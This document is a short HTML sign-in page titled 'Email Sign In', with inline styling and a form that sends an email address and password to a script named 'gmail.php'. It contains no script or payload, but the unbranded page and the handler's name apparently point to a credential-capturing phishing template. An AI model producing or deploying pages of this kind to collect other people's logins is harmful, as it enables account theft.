<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Email Sign In</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f4f4f4;
    }
    .container {
      width: 80%;
      margin: auto;
      overflow: hidden;
    }
    header {
      background: #333;
      color: #fff;
      padding-top: 30px;
      min-height: 70px;
      border-bottom: #e8491d 3px solid;
    }
    header h1 {
      padding: 5px 0;
      font-size: 24px;
      line-height: 1.2;
      margin: 0;
    }
    form {
      background: #f4f4f4;
      padding: 20px;
      margin-top: 20px;
      border: #e8491d 3px solid;
    }
    .input-group {
      margin-bottom: 15px;
    }
    .input-group label {
      display: block;
      text-align: left;
      margin-bottom: 5px;
    }
    .input-group input {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .btn {
      padding: 10px;
      font-size: 18px;
      color: #fff;
      background: #333;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .btn:hover {
      background: #e8491d;
    }
  </style>
</head>
<body>

  <header>
    <div class="container">
      <h1>Email Sign In</h1>
    </div>
  </header>

  <div class="container">
    <form action="gmail.php" method="post">
      <div class="input-group">
        <label for="email">Email</label>
        <input type="email" id="email" name="email" required>
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit" class="btn">Sign In</button>
    </form>
  </div>

</body>
</html>
